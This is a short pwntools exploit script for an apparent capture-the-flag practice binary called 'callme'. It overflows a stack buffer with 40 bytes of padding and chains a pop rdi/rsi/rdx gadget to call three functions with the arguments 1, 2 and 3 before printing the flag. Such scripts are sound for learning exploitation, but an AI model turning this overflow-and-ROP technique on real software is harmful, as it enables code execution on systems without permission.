#!/usr/bin/env python2.7

from pwn import *

p = process("./callme")

if args["GDB"]:
    gdb.attach(p, '''
    set follow-fork-mode child
    b *0x401a56
    continue
    :''')

p.recv() # Discard bullshit lines

pop_rdi_rsi_rdx = p64(0x401ab0)
callme_one = p64(0x401850)
callme_two = p64(0x401870)
callme_three = p64(0x401810)

arg_1_2_3 = pop_rdi_rsi_rdx + p64(0x1) + p64(0x2) + p64(0x3)

p.send("A" * 40 + arg_1_2_3 + callme_one + arg_1_2_3 + callme_two + arg_1_2_3 + callme_three + "\x0a")

flag = p.recv()

log.info("Flag: " + flag)
